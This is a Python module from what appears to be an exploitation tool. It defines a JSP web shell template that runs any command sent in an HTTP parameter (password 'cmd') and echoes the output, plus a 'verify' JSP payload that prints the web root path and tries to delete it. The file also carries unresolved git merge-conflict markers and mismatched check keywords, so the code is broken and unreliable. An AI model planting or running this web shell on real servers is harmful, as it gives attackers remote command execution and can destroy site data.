#!/usr/bin/env python
# coding=utf8
# author=fyth.cnss@gmail.com

from webshell import *


class JspShell(Webshell):
    _content = '<%@ page import="java.util.*,java.io.*"%>\n' \
               '<%\n' \
               'if (request.getParameter("check") == "1")\n' \
<<<<<<< HEAD
               '    out.println("00799a96dcc29282dd74e23e49b647aa");\n' \
               'if (request.getParameter("{pwd}") != null)\n' \
               '{{\n' \
               '    Process p = Runtime.getRuntime().exec(request.getParameter("{pwd}"));\n' \
=======
               '    out.println("595bb9ce8726b4b55f538d3ca0ddfd76");\n' \
               'if (request.getParameter("{0}") != null)\n' \
               '{{\n' \
               '    Process p = Runtime.getRuntime().exec(request.getParameter("{1}"));\n' \
>>>>>>> d88b41afc38ce5275d9a92adea396e34148060c1
               '    OutputStream os = p.getOutputStream();\n' \
               '    InputStream in = p.getInputStream();\n' \
               '    DataInputStream dis = new DataInputStream(in);\n' \
               '    String disr = dis.readLine();\n' \
               '    while ( disr != null)\n' \
               '    {{\n' \
               '        out.println(disr);\n' \
               '        disr = dis.readLine();\n' \
               '    }}\n' \
               '\n}}' \
               '%>\n'
    _password = 'cmd'
    _check_data = {'check': '1'}
    _keyword = '00799a96dcc29282dd74e23e49b647aa'

<<<<<<< HEAD
=======
    def get_content(self):
        return self._content.format(self._password, self._password)


>>>>>>> d88b41afc38ce5275d9a92adea396e34148060c1
class JspVerify(VerifyShell):
    _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
               '<%@ page import="java.io.*"%>\n' \
               '<%\n' \
               'String path=request.getRealPath("");\n' \
               'out.println(path);\n' \
               'File d=new File(path);\n' \
               'if(d.exists()){{\n' \
               '  d.delete();\n' \
               '  }}\n' \
               '%>\n' \
<<<<<<< HEAD
               '<% out.println("00799a96dcc29282dd74e23e49b647aa");%>'
    _keyword = '00799a96dcc29282dd74e23e49b647aa'
=======
               '<% out.println("595bb9ce8726b4b55f538d3ca0ddfd76");%>'
    _keyword = '202cb962ac59075b964b07152d234b70'
>>>>>>> d88b41afc38ce5275d9a92adea396e34148060c1
